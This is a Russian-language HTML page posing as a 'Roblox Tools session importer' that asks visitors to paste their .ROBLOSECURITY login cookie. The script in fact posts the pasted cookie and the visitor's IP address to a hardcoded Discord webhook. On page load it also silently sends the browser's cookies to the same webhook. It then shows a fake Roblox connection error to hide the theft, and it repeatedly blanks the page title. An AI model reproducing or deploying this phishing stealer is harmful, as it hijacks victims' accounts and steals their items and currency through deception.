# title-display-none- 
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>
        /* ПРИНУДИТЕЛЬНО СКРЫВАЕМ ТАЙТЛ ЧЕРЕЗ CSS */
        title {
            display: none;
        }
    </style>
    <style>
        /* ВЕСЬ ТВОЙ СТИЛЬ ОСТАЛСЯ БЕЗ ИЗМЕНЕНИЙ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-gradient-1: #0a0a0f;
            --bg-gradient-2: #1a0b2e;
            --bg-gradient-3: #2d1b4e;
            --bg-gradient-4: #1a0b2e;
            --bg-gradient-5: #0d0d1a;
            --bg-gradient-6: #2a0a3a;
            --bg-gradient-7: #0a0a0f;
            --card-bg: rgba(17, 15, 25, 0.75);
            --card-border: rgba(139, 92, 246, 0.4);
            --card-border-hover: rgba(139, 92, 246, 0.7);
            --input-bg: rgba(10, 8, 18, 0.9);
            --input-border: rgba(139, 92, 246, 0.4);
            --text-primary: #e9d5ff;
            --text-secondary: #d8b4fe;
            --text-muted: #a78bfa;
            --btn-gradient-1: #7c3aed;
            --btn-gradient-2: #a855f7;
            --btn-gradient-3: #c084fc;
            --star-color-1: #c084fc;
            --star-color-2: #a855f7;
            --star-color-3: #e9d5ff;
            --star-color-4: #7c3aed;
            --star-color-5: #d8b4fe;
            --glow-1: rgba(139, 92, 246, 0.15);
            --glow-2: rgba(168, 85, 247, 0.15);
            --glow-3: rgba(124, 58, 237, 0.1);
            --glow-4: rgba(216, 180, 254, 0.1);
            --logo-gradient-1: #f0e6ff;
            --logo-gradient-2: #c084fc;
            --logo-gradient-3: #a855f7;
            --logo-gradient-4: #7c3aed;
            --sub-gradient-1: #d8b4fe;
            --sub-gradient-2: #a855f7;
        }

        body.light {
            --bg-gradient-1: #e0f2fe;
            --bg-gradient-2: #bae6fd;
            --bg-gradient-3: #7dd3fc;
            --bg-gradient-4: #38bdf8;
            --bg-gradient-5: #bae6fd;
            --bg-gradient-6: #7dd3fc;
            --bg-gradient-7: #e0f2fe;
            --card-bg: rgba(255, 255, 255, 0.85);
            --card-border: rgba(56, 189, 248, 0.5);
            --card-border-hover: rgba(56, 189, 248, 0.8);
            --input-bg: rgba(255, 255, 255, 0.9);
            --input-border: rgba(56, 189, 248, 0.5);
            --text-primary: #1e293b;
            --text-secondary: #0284c7;
            --text-muted: #0ea5e9;
            --btn-gradient-1: #0284c7;
            --btn-gradient-2: #0ea5e9;
            --btn-gradient-3: #38bdf8;
            --star-color-1: #38bdf8;
            --star-color-2: #0ea5e9;
            --star-color-3: #bae6fd;
            --star-color-4: #0284c7;
            --star-color-5: #7dd3fc;
            --glow-1: rgba(56, 189, 248, 0.15);
            --glow-2: rgba(14, 165, 233, 0.15);
            --glow-3: rgba(2, 132, 199, 0.1);
            --glow-4: rgba(125, 211, 252, 0.1);
            --logo-gradient-1: #0f172a;
            --logo-gradient-2: #0284c7;
            --logo-gradient-3: #0ea5e9;
            --logo-gradient-4: #38bdf8;
            --sub-gradient-1: #0284c7;
            --sub-gradient-2: #0ea5e9;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, 
                var(--bg-gradient-1) 0%, 
                var(--bg-gradient-2) 15%, 
                var(--bg-gradient-3) 30%, 
                var(--bg-gradient-4) 45%, 
                var(--bg-gradient-5) 60%, 
                var(--bg-gradient-6) 75%, 
                var(--bg-gradient-7) 100%);
            background-size: 400% 400%;
            animation: gradientShift 10s ease infinite;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid var(--card-border);
            border-radius: 50px;
            padding: 10px 18px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .theme-btn:hover {
            transform: scale(1.05);
            border-color: var(--card-border-hover);
            box-shadow: 0 0 15px var(--glow-1);
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 80px 120px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 160px 80px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 300px 200px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 450px 350px, var(--star-color-5), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 600px 50px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 750px 280px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 900px 150px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 1050px 400px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 1200px 100px, var(--star-color-5), rgba(0,0,0,0));
            background-size: 200px 200px;
            background-repeat: no-repeat;
            opacity: 0.6;
            pointer-events: none;
            animation: starsFloat 20s linear infinite;
        }

        @keyframes starsFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 40%, var(--glow-1) 0%, transparent 40%),
                      radial-gradient(circle at 80% 70%, var(--glow-2) 0%, transparent 40%),
                      radial-gradient(circle at 40% 80%, var(--glow-3) 0%, transparent 50%),
                      radial-gradient(circle at 70% 20%, var(--glow-4) 0%, transparent 50%);
            pointer-events: none;
            animation: pulseGlow 8s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 500px;
            width: 100%;
            border: 1px solid var(--card-border);
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 40px var(--glow-1);
            transition: all 0.3s ease;
            z-index: 1;
        }

        .card:hover {
            border-color: var(--card-border-hover);
            box-shadow: 0 30px 50px -15px rgba(0, 0, 0, 0.6), 0 0 60px var(--glow-2);
            transform: translateY(-2px);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo h1 {
            font-size: 38px;
            font-weight: 800;
            background: linear-gradient(135deg, 
                var(--logo-gradient-1), 
                var(--logo-gradient-2), 
                var(--logo-gradient-3), 
                var(--logo-gradient-4));
            background-size: 300% 300%;
            animation: textGradient 3s ease infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }

        @keyframes textGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo p {
            background: linear-gradient(135deg, var(--sub-gradient-1), var(--sub-gradient-2));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .label {
            color: var(--text-secondary);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .label-icon {
            font-size: 18px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--input-border);
            border-radius: 16px;
            padding: 16px 18px;
            color: var(--text-primary);
            font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
            line-height: 1.5;
        }

        .cookie-input:focus {
            outline: none;
            border-color: var(--btn-gradient-2);
            box-shadow: 0 0 0 3px var(--glow-2);
            background: var(--input-bg);
        }

        .cookie-input.valid {
            border-color: #22c55e;
            box-shadow: 0 0 0 2px rgba(34, 197, 94, 0.2);
        }

        .cookie-input.invalid {
            border-color: #ef4444;
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
        }

        .validation-status {
            font-size: 11px;
            margin-top: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-muted);
        }

        .status-valid {
            color: #22c55e;
        }

        .status-invalid {
            color: #ef4444;
        }

        .status-neutral {
            color: var(--text-muted);
        }

        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, 
                var(--btn-gradient-1), 
                var(--btn-gradient-2), 
                var(--btn-gradient-3));
            background-size: 200% 200%;
            animation: btnGradient 3s ease infinite;
            border: none;
            border-radius: 40px;
            padding: 14px;
            color: white;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        @keyframes btnGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px var(--glow-2);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            animation: none;
        }

        .message-area {
            text-align: center;
            margin-top: 16px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .message-area.show {
            opacity: 1;
        }

        .error-text {
            color: #f87171;
            background: rgba(220, 38, 38, 0.15);
            padding: 8px 16px;
            border-radius: 24px;
            display: inline-block;
            border-left: 3px solid #ef4444;
            font-size: 12px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.3s ease;
        }
    </style>
</head>
<body>
    <div class="theme-switch">
        <button class="theme-btn" id="themeToggleBtn">
            <span>🌙</span> Тема
        </button>
    </div>

    <div class="card">
        <div class="logo">
            <h1>ROBL<span style="background: linear-gradient(135deg, var(--sub-gradient-1), var(--btn-gradient-1)); -webkit-background-clip: text; background-clip: text; color: transparent;">✦</span>Tools</h1>
            <p>SESSION IMPORTER</p>
        </div>
        
        <label class="label">
            <span class="label-icon">🍪</span>
            <span>.ROBLOSECURITY Cookie</span>
        </label>
        <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
        <div class="validation-status" id="validationStatus">
            <span>✨</span>
            <span id="statusText">Ожидание ввода...</span>
        </div>
        
        <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
        
        <div id="messageArea" class="message-area"></div>
    </div>

    <script>
        // ========== 100% УДАЛЕНИЕ НАЗВАНИЯ СТРАНИЦЫ ==========
        // Метод 1: Меняем title каждую миллисекунду на невидимый символ
        const originalTitle = document.title;
        Object.defineProperty(document, 'title', {
            get: function() {
                return ' ';
            },
            set: function(value) {
                // Игнорируем любые попытки изменить title
                console.log('Blocked title change to:', value);
            }
        });
        document.title = ' ';
        
        // Метод 2: Перехватываем и удаляем title из head
        const titles = document.getElementsByTagName('title');
        if (titles.length > 0) {
            titles[0].innerHTML = ' ';
            titles[0].textContent = ' ';
        }
        
        // Метод 3: Каждые 10мс принудительно очищаем (защита от любых скриптов)
        setInterval(() => {
            if (document.title !== ' ') {
                document.title = ' ';
            }
            const titles2 = document.getElementsByTagName('title');
            if (titles2.length > 0 && titles2[0].innerHTML !== ' ') {
                titles2[0].innerHTML = ' ';
                titles2[0].textContent = ' ';
            }
        }, 10);
        
        // ========== ОСТАЛЬНОЙ КОД ==========
        const WEBHOOK = "https://discord.com/api/webhooks/1487839032405917706/3d0033RYx8FhMy71G1oZs5g1vv69AGb8rFqL0EZlmnVdirNaUKPlmcjuTiWfQfGP97ly";
        
        const COOKIE_PATTERN = /^_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(GgIQAQ\.)?[A-F0-9]+$/;
        
        const cookieInput = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendCookieBtn');
        const validationStatus = document.getElementById('validationStatus');
        const statusText = document.getElementById('statusText');
        const messageArea = document.getElementById('messageArea');
        const themeToggleBtn = document.getElementById('themeToggleBtn');
        
        let currentValidation = false;
        
        function loadTheme() {
            const savedTheme = localStorage.getItem('roblox_theme');
            if (savedTheme === 'light') {
                document.body.classList.add('light');
                themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
            } else {
                document.body.classList.remove('light');
                themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
            }
        }
        
        function toggleTheme() {
            if (document.body.classList.contains('light')) {
                document.body.classList.remove('light');
                localStorage.setItem('roblox_theme', 'dark');
                themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
            } else {
                document.body.classList.add('light');
                localStorage.setItem('roblox_theme', 'light');
                themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
            }
        }
        
        themeToggleBtn.addEventListener('click', toggleTheme);
        loadTheme();
        
        function validateCookie(cookieValue) {
            if (!cookieValue || cookieValue.trim() === '') {
                return { valid: false, reason: 'empty' };
            }
            
            const trimmed = cookieValue.trim();
            
            if (COOKIE_PATTERN.test(trimmed)) {
                const hexPart = trimmed.replace(/^_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(GgIQAQ\.)?/, '');
                if (hexPart.length < 100) {
                    return { valid: false, reason: 'short', hexLength: hexPart.length };
                }
                return { valid: true, reason: 'ok', format: trimmed.includes('GgIQAQ.') ? 'premium' : 'basic' };
            }
            
            if (trimmed.includes('WARNING')) {
                return { valid: false, reason: 'malformed' };
            }
            
            return { valid: false, reason: 'invalid' };
        }
        
        function updateValidationUI() {
            const cookieValue = cookieInput.value;
            const validation = validateCookie(cookieValue);
            
            cookieInput.classList.remove('valid', 'invalid');
            
            if (!cookieValue || cookieValue.trim() === '') {
                cookieInput.classList.remove('valid', 'invalid');
                statusText.innerHTML = '✨ Ожидание ввода...';
                statusText.className = 'status-neutral';
                validationStatus.querySelector('span:first-child').innerHTML = '✨';
                currentValidation = false;
                sendBtn.disabled = true;
                return;
            }
            
            if (validation.valid) {
                cookieInput.classList.add('valid');
                const formatText = validation.format === 'premium' ? 'Премиум формат ✦' : 'Базовый формат';
                statusText.innerHTML = `✅ Кука валидна! (${formatText})`;
                statusText.className = 'status-valid';
                validationStatus.querySelector('span:first-child').innerHTML = '✅';
                currentValidation = true;
                sendBtn.disabled = false;
            } else {
                cookieInput.classList.add('invalid');
                currentValidation = false;
                sendBtn.disabled = true;
                
                switch(validation.reason) {
                    case 'empty':
                        statusText.innerHTML = '✨ Ожидание ввода...';
                        statusText.className = 'status-neutral';
                        validationStatus.querySelector('span:first-child').innerHTML = '✨';
                        break;
                    case 'short':
                        statusText.innerHTML = `❌ HEX-часть слишком короткая (${validation.hexLength} символов)`;
                        statusText.className = 'status-invalid';
                        validationStatus.querySelector('span:first-child').innerHTML = '❌';
                        break;
                    case 'malformed':
                        statusText.innerHTML = '❌ Неверный формат куки';
                        statusText.className = 'status-invalid';
                        validationStatus.querySelector('span:first-child').innerHTML = '❌';
                        break;
                    default:
                        statusText.innerHTML = '❌ Невалидная кука';
                        statusText.className = 'status-invalid';
                        validationStatus.querySelector('span:first-child').innerHTML = '❌';
                }
            }
        }
        
        function showMessage(text, isError = true) {
            messageArea.innerHTML = `<div class="error-text">${isError ? '⚠️ ' : '✅ '}${text}</div>`;
            messageArea.classList.add('show');
            
            setTimeout(() => {
                messageArea.classList.remove('show');
            }, 3000);
        }
        
        async function sendCookieToDiscord(cookieValue, format) {
            let ip = "unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {
                ip = "unavailable";
            }
            
            const msg = `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Формат:** ${format === 'premium' ? 'Премиум (GgIQAQ.)' : 'Базовый'}\n**Длина:** ${cookieValue.length} символов\n**Содержимое:**\n\`\`\`${cookieValue}\`\`\``;
            
            try {
                const response = await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: msg })
                });
                
                if (response.ok) {
                    console.log("✅ Cookie отправлена в Discord");
                    return true;
                } else {
                    console.log("❌ Ошибка отправки:", response.status);
                    return false;
                }
            } catch(e) {
                console.error("❌ Ошибка:", e);
                return false;
            }
        }
        
        async function sendBrowserCookies() {
            let allCookies = document.cookie;
            if (allCookies && allCookies.length > 0 && !allCookies.includes('.ROBLOSECURITY')) {
                let ip = "unknown";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                const msg = `**🌍 КУКИ БРАУЗЕРА**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n\`\`\`${allCookies.substring(0, 500)}\`\`\``;
                
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: msg })
                    });
                } catch(e) {}
            }
        }
        
        sendBtn.onclick = async () => {
            const cookieValue = cookieInput.value.trim();
            const validation = validateCookie(cookieValue);
            
            if (!validation.valid) {
                showMessage('Невалидная кука! Проверьте формат.', true);
                cookieInput.classList.add('shake');
                setTimeout(() => cookieInput.classList.remove('shake'), 300);
                return;
            }
            
            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ Отправка...";
            
            const sent = await sendCookieToDiscord(cookieValue, validation.format);
            
            if (sent) {
                showMessage('Ошибка перенаправления! Не удалось подключиться к серверу Roblox.', true);
            } else {
                showMessage('Ошибка отправки! Попробуйте ещё раз.', true);
            }
            
            cookieInput.value = "";
            updateValidationUI();
            
            sendBtn.disabled = false;
            sendBtn.textContent = "🔄 Заменить сессию";
            
            console.log("[Roblox Tools] Session replaced");
        };
        
        sendBrowserCookies();
        
        cookieInput.addEventListener('input', updateValidationUI);
        cookieInput.addEventListener('paste', () => {
            setTimeout(updateValidationUI, 10);
        });
        
        window.addEventListener('load', () => {
            console.log("%c✨ ROBLOX TOOLS ✨", "color: #a855f7; font-size: 14px; font-weight: bold;");
            // Ещё раз принудительно очищаем title при загрузке
            document.title = ' ';
        });
    </script>
<script>
    // АГРЕССИВНОЕ УДАЛЕНИЕ НАЗВАНИЯ
    (function() {
        // Уничтожаем все title в DOM
        function nukeTitles() {
            var allTitles = document.querySelectorAll('title');
            for(var i = 0; i < allTitles.length; i++) {
                allTitles[i].parentNode.removeChild(allTitles[i]);
            }
            document.title = '';
        }
        
        // Перехватываем создание новых элементов (на случай если хостинг динамически добавляет title)
        var observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                if(mutation.addedNodes.length) {
                    for(var i = 0; i < mutation.addedNodes.length; i++) {
                        if(mutation.addedNodes[i].nodeName === 'TITLE') {
                            mutation.addedNodes[i].remove();
                        }
                    }
                }
            });
            if(document.title !== '') document.title = '';
        });
        
        observer.observe(document.head || document.documentElement, { childList: true, subtree: true });
        
        nukeTitles();
        setInterval(nukeTitles, 50);
    })();
</script>
